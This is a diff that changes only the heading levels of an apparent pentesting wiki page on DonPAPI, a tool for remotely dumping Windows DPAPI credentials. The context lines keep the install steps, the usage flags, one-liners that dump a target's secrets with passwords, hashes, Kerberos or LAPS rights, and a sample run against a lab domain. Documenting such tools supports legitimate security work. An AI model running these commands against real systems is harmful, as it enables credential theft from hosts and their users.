@@ -55,14 +55,14 @@ With local admin account on a host, we can:
 
 With a user password, or the domain PVK we can unprotect the user's DPAPI secrets.
 
-### Installation
+## Installation
 
 ```plain
 git clone https://github.com/login-securite/DonPAPI.git
 python3 -m pip install -r requirements.txt
 ```
 
-### Usage
+## Usage
 
 ```plain
 DonPAPI.py [-h] [-credz CREDZ] [-pvk PVK] [-d] [-t number of threads] [-o OUTPUT_DIRECTORY] [-H LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-local_auth] [-laps] [-dc-ip ip address]
@@ -71,7 +71,7 @@ DonPAPI.py [-h] [-credz CREDZ] [-pvk PVK] [-d] [-t number of threads] [-o OUTPUT
                   [target]
 ```
 
-### Flags
+## Flags
 
 ```plain
 usage: 
@@ -127,26 +127,26 @@ attacks:
 
 ### Example oneliners
 
-#### Dump all secrets of the target machine with an admin account
+### Dump all secrets of the target machine with an admin account
 
 ```plain
 DonPAPI.py domain/user:passw0rd@target
 ```
 
-#### Using user's hash
+### Using user's hash
 
 ```plain
 DonPAPI.py --hashes <LM>:<NT> domain/user@target
 ```
 
-#### Using kerberos (-k) and local auth (-local_auth)
+### Using kerberos (-k) and local auth (-local_auth)
 
 ```plain
 DonPAPI.py -k domain/user@target
 DonPAPI.py -local_auth user@target
 ```
 
-#### Using a user with LAPS password reading rights
+### Using a user with LAPS password reading rights
 
 ```plain
 DonPAPI.py -laps domain/user:passw0rd@target
@@ -182,7 +182,7 @@ Target can be an IP, IP range, CIDR, file containing list targets (one per line)
 
 Captured credentials etc. is saved in the installation folder `DonPAPI/<target-ip>`
 
-#### Dump all secrets of the target machine with an admin account (practical)
+### Dump all secrets of the target machine with an admin account (practical)
 
 ```plain
 $ python3 DonPAPI.py offsec.nl/administrator:Welkom1234@10.20.30.10
@@ -245,6 +245,6 @@ drwxr-xr-x  7 crypt0rr  staff   224B Feb 21 11:25 Users
 drwxr-xr-x  3 crypt0rr  staff    96B Feb 21 11:25 Windows
 ```
 
-### URL list
+## URL List
 
 * [Github.com - DonPAPI](https://github.com/login-securite/DonPAPI)
